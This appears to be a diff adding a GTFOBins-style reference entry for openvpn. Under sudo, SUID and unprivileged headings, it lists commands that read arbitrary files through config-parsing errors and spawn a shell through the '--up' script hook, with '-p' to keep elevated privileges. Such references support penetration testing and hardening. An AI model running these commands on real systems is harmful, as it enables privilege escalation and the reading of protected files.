@@ -1,0 +1,29 @@
+openvpn
+=======
+
+File read
+---------
+
+[Sudo]
+    openvpn --config /path/to/input-file
+    The file is actually parsed and the first partial wrong line is returned in an error message.
+
+[SUID]
+    openvpn --config /path/to/input-file
+    The file is actually parsed and the first partial wrong line is returned in an error message.
+
+[Unprivileged]
+    openvpn --config /path/to/input-file
+    The file is actually parsed and the first partial wrong line is returned in an error message.
+
+Shell
+-----
+
+[Sudo]
+    openvpn --dev null --script-security 2 --up '/bin/sh -s'
+
+[SUID]
+    openvpn --dev null --script-security 2 --up '/bin/sh -p -s'
+
+[Unprivileged]
+    openvpn --dev null --script-security 2 --up '/bin/sh -s'
